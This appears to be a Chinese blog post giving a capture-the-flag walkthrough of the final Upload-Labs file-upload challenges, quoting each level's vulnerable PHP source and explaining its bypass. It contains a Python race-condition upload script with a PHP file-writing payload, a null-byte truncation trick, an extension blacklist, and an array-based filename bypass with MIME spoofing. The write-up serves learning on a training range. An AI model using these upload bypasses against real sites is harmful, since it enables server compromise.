---
title: Upload-Labs的最后几道题
categories: ['CTF']
tags: ['文件上传漏洞']
date: 2020-11-19 08:47:19
---


## Pass-17

​	（windows环境，php版本5.2.17，题号是18题）

源码：

```php
$is_upload = false;
$msg = null;

if(isset($_POST['submit'])){
    $ext_arr = array('jpg','png','gif');
    $file_name = $_FILES['upload_file']['name'];
    $temp_file = $_FILES['upload_file']['tmp_name'];
    $file_ext = substr($file_name,strrpos($file_name,".")+1);
    $upload_file = UPLOAD_PATH . '/' . $file_name;

    if(move_uploaded_file($temp_file, $upload_file)){
        if(in_array($file_ext,$ext_arr)){
             $img_path = UPLOAD_PATH . '/'. rand(10, 99).date("YmdHis").".".$file_ext;
             rename($upload_file, $img_path);
             $is_upload = true;
        }else{
            $msg = "只允许上传.jpg|.png|.gif类型文件！";
            unlink($upload_file);
        }
    }else{
        $msg = '上传出错！';
    }
}
```

​	思路和前面的一样，获取文件信息，移动文件到**upload**文件夹，第12行使用了白名单验证，多了第14行的`rename`函数，看名称就是重命名的函数，所以我们可以在重命名之前访问我们上传的文件，所以这题用到了**上传竞争**，使用`python`脚本不断的向服务器上传文件，然后访问上传的文件，上传的文件中有一句代码`<?php fputs(fopen('shell.php','w'),'<?php phpinfo();?>');?>`这段代码执行以后，会创建一个名为`shell.php`里面有一句`<?php phpinfo();?>`的文件。

​	脚本代码

```python
#coding=utf-8
import requests
from multiprocessing import Pool
def CompeteUpload(list):
    url="http://upload-labs/Pass-18/index.php"   #上传页面
    geturl="http://upload-labs/upload/233.php"	 #访问上传文件
    file={'upload_file':('233.php',"<?php fputs(fopen('shell.php','w'),'<?php phpinfo();?>');?>",'image/jpeg')}
    data={'submit':'上传'}
    r=requests.post(url=url,data=data,files=file)
    #print "test upload...."
    r1=requests.get(url=geturl)
    if r1.status_code==200:
        print ("upload success!")
if __name__=="__main__":
    pool = Pool(10)
    pool.map(CompeteUpload, range(10000))
    pool.close()
    pool.join()
```

​	第一次用python的我在这里知道了`pip`。这道题因为要不断的上传和访问文件，所以对在线靶场不友好，所以才选择了本地环境解题。完工

![](https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201119090033.png)



## Pass-18（失手）

​	18题失手了没有思路，如果使用`include.php`文件包含的话还可以，看了看网上大部分的博客都是敷敷衍衍过去的，找到了一篇稍微有点思路的，使用的是`apache2.2.x的解析漏洞`，这个漏洞的思路就是，apache服务器在解析有多个后缀名的文件时，从最后一个开始向前扫描，如果不认识就跳过，直到遇到一个认识的文件后缀，就把这个文件以这个能识别的后缀解析。

[Apache文件解析漏洞](https://blog.csdn.net/qq_32434307/article/details/79480316)

[apache httpd多后缀解析漏洞复现](https://www.cnblogs.com/yuzly/p/11226377.html)

​	源码中还有一个可以突破的点是同样使用了**重命名函数**，所以应该还是可以使用竞争上传访问得到，但是使用了白名单验证，我实在是没招了所以~~先摸为敬~~。



## Pass-19

（windows环境，php5.2.17，magic_quotes_gpc=Off）

源码：

```php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array("php","php5","php4","php3","php2","html","htm","phtml","pht","jsp","jspa","jspx","jsw","jsv","jspf","jtml","asp","aspx","asa","asax","ascx","ashx","asmx","cer","swf","htaccess");

        $file_name = $_POST['save_name'];
        $file_ext = pathinfo($file_name,PATHINFO_EXTENSION);

        if(!in_array($file_ext,$deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH . '/' .$file_name;
            if (move_uploaded_file($temp_file, $img_path)) { 
                $is_upload = true;
            }else{
                $msg = '上传出错！';
            }
        }else{
            $msg = '禁止保存为该类型文件！';
        }

    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}
```

​	源码第七行使用了**POST**来接受文件的命名，前面有类似题的是使用了**0x00截断上传**，后面也同样是`move_uploaded_file`移动文件的函数，还使用了黑名单验证，方法就很明确，使用**截断上传**。别忘了截断上传需要的特定条件：php版本需要低于`5.3.29`、`magic_quotes_gpc`需要为关闭状态。

![](https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201119164220.png)

​	同样是命名为`phpa`方便在十六进制表里修改为`00`

![](https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201119162729.png)

​	打开图片把url链接`http://upload-labs/upload/upload-19.php�`修改一下即可。完工

![](https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201119164458.png)

​	其实这道题还有一个思路，因为题目使用了**黑名单验证**，分析源码没有设置大小写过滤，所以也可以使用大小写方法通过如`Php`，不演示了。



## Pass-20

（LInux环境，php7.2.21）

源码：

```php
$is_upload = false;
$msg = null;
if(!empty($_FILES['upload_file'])){
    //检查MIME
    $allow_type = array('image/jpeg','image/png','image/gif');
    if(!in_array($_FILES['upload_file']['type'],$allow_type)){
        $msg = "禁止上传该类型文件!";
    }else{
        //检查文件名
        $file = empty($_POST['save_name']) ? $_FILES['upload_file']['name'] : $_POST['save_name'];
        if (!is_array($file)) {
            $file = explode('.', strtolower($file));
        }

        $ext = end($file);
        $allow_suffix = array('jpg','png','gif');
        if (!in_array($ext, $allow_suffix)) {
            $msg = "禁止上传该后缀文件!";
        }else{
            $file_name = reset($file) . '.' . $file[count($file) - 1];
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH . '/' .$file_name;
            if (move_uploaded_file($temp_file, $img_path)) {
                $msg = "文件上传成功！";
                $is_upload = true;
            } else {
                $msg = "文件上传失败！";
            }
        }
    }
}else{
    $msg = "请选择要上传的文件！";
}
```

​	这道题使用了`MIME`验证和白名单验证。先看第10行使用了`三目运算符`判断`$_POST['save_name']`是否为空，若为空则执行`:`前获取上传文件的名称，若不为空则获取POST中的`save_name`。第11行使用了`is_array`函数判断是否是一个数组，然后使用`explode`截断文件名转换小写并返回数组。也就是说，如果我们POST中的`save_name`是个数组的就可以跳过11行的判断。15行使用`end`函数获取数组中的最后一个元素用于后缀验证。20行把文件名进行拼接：数组**第一个**元素+数组元素**总数-1**的那个元素。

所以我们可以构造一个这样的数组用于绕过：

![](https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201119170734.png)

​	数组[2]用于绕过白名单，文件名为：`数组[0].数组[1]`，但是数组[1]是空的所以只剩下`数组[0].`（后面有个点）

​	别忘了还要绕过**MIME**

![](https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201119172340.png)

![](https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201119172415.png)

完工

## 最后

​	Upload labs的20道题大部分完成了，有两道题没完成，但是也学到了不少东西，这些天再抽空写一个总结吧。射射观看。